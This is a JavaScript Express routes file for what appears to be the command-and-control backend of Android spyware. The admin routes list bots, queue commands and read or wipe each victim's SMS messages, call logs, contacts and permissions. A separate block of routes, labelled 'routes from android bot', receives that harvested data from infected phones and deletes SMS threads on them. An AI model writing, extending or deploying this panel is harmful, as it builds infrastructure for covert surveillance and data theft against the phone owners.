var ctrls = require('require-dir')('./controllers')
var path = require('path')
var auth = require('./middlewares/auth')

module.exports = function Routes(app, io) {

  var bots_ctrl = ctrls.bots_ctrl(io)
  var commands_ctrl = ctrls.commands_ctrl(io)
  var messages_ctrl = ctrls.messages_ctrl(io)
  var call_log_ctrl = ctrls.call_log_ctrl(io)
  var notifications_ctrl = ctrls.notifications_ctrl(io)
  var permissions_ctrl = ctrls.permissions_ctrl(io)
  var contacts_ctrl = ctrls.contacts_ctrl(io)

  // admin routes
  app.post('/login', auth)
  app.get('/pending-commands', commands_ctrl.pendingCommands)
  app.get('/bots', auth, bots_ctrl.index)
  app.get('/bots/:id', auth, bots_ctrl.show)
  app.delete('/bots/:id', auth, bots_ctrl.delete)
  app.post('/add-command', auth, commands_ctrl.addCommand)
  app.get('/get-commands', auth, commands_ctrl.getCommands)
  app.delete('/commands/:id', auth, commands_ctrl.delete)
  app.delete('/clear-messages/:uid', auth, messages_ctrl.clearMessages)
  app.get('/get-messages/:uid', auth, messages_ctrl.getMessages)
  app.get('/call-logs/:uid', auth, call_log_ctrl.showLogs)
  app.delete('/call-logs/:uid', auth, call_log_ctrl.clear)
  app.get('/permissions/:uid', auth, permissions_ctrl.getPermissions)
  app.get('/contacts/:uid', auth, contacts_ctrl.getContacts)
  app.delete('/contacts/:uid', auth, contacts_ctrl.clear)

  // routes from android bot
  app.post('/status/:uid', bots_ctrl.updateStatus)
  app.post('/notify', notifications_ctrl.notify)
  app.post('/call-logs', call_log_ctrl.create)
  app.post('/message', messages_ctrl.addMessage)
  app.post('/permissions/:uid/:device', permissions_ctrl.updatePermissions)
  app.post('/contacts', contacts_ctrl.create)
  app.delete('/sms/thread/:uid/:id', messages_ctrl.deleteThread)

  // html5 push state
  app.get(/.*\.(html|js|css|map|jpg|png|gif)/, function(req, res, next) {
    res.status(404).send()
  })
  app.get('*', function(req, res, next) {
    res.sendFile(path.join(__dirname, './dist/index.html'));
  })
}
